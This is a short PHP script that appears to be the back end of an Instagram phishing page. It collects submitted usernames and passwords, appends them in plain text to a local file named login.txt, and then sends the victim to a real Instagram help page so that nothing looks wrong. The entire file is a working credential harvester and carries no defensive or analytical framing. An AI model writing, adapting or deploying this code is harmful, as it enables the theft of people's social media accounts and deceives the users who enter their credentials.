<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $username = htmlspecialchars(trim($_POST['username']));
    $password = htmlspecialchars(trim($_POST['password']));
    $entry = "Username: $username | Password: $password\n";
    file_put_contents("login.txt", $entry, FILE_APPEND | LOCK_EX);

    // Redirect to the official Instagram verification request page
    header("Location: https://help.instagram.com/398038890351915");
    exit;
} else {
    echo "Invalid request.";
}
